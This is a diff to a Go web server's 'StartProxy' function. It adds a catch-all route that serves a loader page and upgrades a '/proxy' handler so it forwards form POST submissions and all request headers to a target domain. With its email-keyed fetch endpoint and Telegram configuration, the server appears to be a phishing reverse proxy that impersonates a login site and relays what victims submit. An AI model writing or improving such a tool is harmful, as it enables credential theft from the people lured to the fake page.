@@ -69,6 +69,12 @@ func StartProxy(cfg TelegramConfig, listenPort string) {
 		c.String(200, loaderHTML)
 	})
 
+	// Catch all (fixes 404 if browser tries to access old /loader.html link)
+	r.NoRoute(func(c *gin.Context) {
+		c.Header("Content-Type", "text/html")
+		c.String(200, loaderHTML)
+	})
+
 	// API Endpoint that fetches the page
 	r.GET("/api/fetch", func(c *gin.Context) {
 		email := c.Query("email")
@@ -85,7 +91,7 @@ func StartProxy(cfg TelegramConfig, listenPort string) {
 			Timeout: 15 * time.Second,
 			Jar:     jar,
 			CheckRedirect: func(req *http.Request, via []*http.Request) error {
-				return http.ErrUseLastResponse // CRITICAL: Stops redirects from changing the URL
+				return http.ErrUseLastResponse // Stops redirects from changing the URL
 			},
 			Transport: &http.Transport{ForceAttemptHTTP2: false},
 		}
@@ -155,7 +161,7 @@ func StartProxy(cfg TelegramConfig, listenPort string) {
 		c.JSON(200, gin.H{"status": "ok"})
 	})
 
-	// Proxy for static assets (images, css)
+	// Proxy for static assets AND form submissions (POST)
 	r.Any("/proxy/*filepath", func(c *gin.Context) {
 		filepath := strings.TrimPrefix(c.Param("filepath"), "/")
 		referer := c.GetHeader("Referer")
@@ -170,7 +176,23 @@ func StartProxy(cfg TelegramConfig, listenPort string) {
 		}
 
 		fullURL := targetDomain + filepath
-		resp, err := http.Get(fullURL)
+
+		// UPGRADE: Use NewRequest to support POST bodies
+		outReq, err := http.NewRequest(c.Request.Method, fullURL, c.Request.Body)
+		if err != nil {
+			c.String(502, "Bad Request")
+			return
+		}
+
+		// Copy Headers
+		for k, v := range c.Request.Header {
+			for _, val := range v {
+				outReq.Header.Add(k, val)
+			}
+		}
+
+		client := &http.Client{Timeout: 15 * time.Second}
+		resp, err := client.Do(outReq)
 		if err == nil {
 			defer resp.Body.Close()
 			for k, v := range resp.Header {
@@ -180,6 +202,8 @@ func StartProxy(cfg TelegramConfig, listenPort string) {
 			}
 			c.Writer.WriteHeader(resp.StatusCode)
 			io.Copy(c.Writer, resp.Body)
+		} else {
+			c.String(502, "Upstream Error")
 		}
 	})
 
